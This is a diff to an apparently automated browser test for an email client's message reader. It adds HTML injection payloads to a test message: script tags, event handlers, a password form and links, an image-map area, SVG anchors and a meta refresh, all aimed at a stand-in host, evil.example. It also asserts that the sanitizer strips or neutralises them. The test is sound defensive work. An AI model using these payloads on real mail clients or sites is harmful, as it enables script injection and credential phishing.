@@ -115,6 +115,8 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
       const unsafe = id.startsWith("MSG31_") ? `<script>parent.pwned = 1</script><img id="h-img" src="data:," onerror="parent.pwned = 1">` +
         `<form id="h-form" action="https://evil.example/"><input id="h-input" name="pw"><button>Go</button></form>` +
         `<a id="h-link" href="https://evil.example/" ping="https://evil.example/ping" target="_top">link</a>` +
+        `<img src="data:," usemap="#m"><map name="m"><area id="h-area" href="https://evil.example/" target="_self" shape="rect" coords="0,0,9,9"></map>` +
+        `<svg><a id="h-svga" href="https://evil.example/" target="_self"><text y="9">x</text></a></svg>` +
         `<meta http-equiv="refresh" content="0;url=https://evil.example/"><iframe id="h-frame" src="https://evil.example/"></iframe>` +
         `<object id="h-obj" data="https://evil.example/x"></object><svg id="h-svg" onload="parent.pwned = 1"><circle r="1"/></svg>` : "";
       // Every message tries to hide or cover the printed header.
@@ -233,7 +235,8 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
     const link = d.getElementById("h-link");
     return { scripts: d.querySelectorAll("script").length, forms: d.querySelectorAll("form, input, button, textarea, select").length,
       frames: d.querySelectorAll("iframe, object, embed").length, refresh: d.querySelectorAll('meta[http-equiv="refresh" i]').length, csp: d.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').length, handlers,
-      link: link && { ping: link.hasAttribute("ping"), target: link.target, rel: link.rel }, img: !!d.getElementById("h-img") };
+      link: link && { ping: link.hasAttribute("ping"), target: link.target, rel: link.rel }, img: !!d.getElementById("h-img"),
+      others: ["h-area", "h-svga"].map(id => d.getElementById(id)?.getAttribute("target") ?? "gone") };
   }).catch(e => ({ error: e.message }));
   results.unsafe.pwned = await page.evaluate(() => window.pwned ?? null);
   const frameImgs = await page.frameLocator("#r-body").locator("img").evaluateAll(els => els.map(e => e.getAttribute("src") || ""));
@@ -884,7 +887,8 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   expect(!/[\u202A-\u202E\u2066-\u2069]/.test(bd) && bd.includes("Pay eulav") && bd.includes("Bobevil") && bd.includes("invfdp.exe"),
     "bidi controls are removed from names, subjects and filenames: " + JSON.stringify(bd));
   const u = results.unsafe;
-  expect(!u.error && !u.scripts && !u.forms && !u.frames && !u.refresh && u.csp === 1 && !u.handlers.length && u.link && !u.link.ping && u.link.target === "_blank" && /noopener/.test(u.link.rel) && u.pwned === null,
+  expect(!u.error && !u.scripts && !u.forms && !u.frames && !u.refresh && u.csp === 1 && !u.handlers.length && u.link && !u.link.ping && u.link.target === "_blank" && /noopener/.test(u.link.rel) && u.pwned === null &&
+    u.others.every(t => t === "_blank" || t === "gone"),
     "the reader removes scripts, forms, frames, refresh, handlers and pings: " + JSON.stringify(u));
   expect(!unexpectedHosts.size, "no request left for the real network: " + [...unexpectedHosts].join(", "));
   expect(results.slowLoad.rows > 0, "an action during a slow folder load leaves the folder filled: " + JSON.stringify(results.slowLoad));
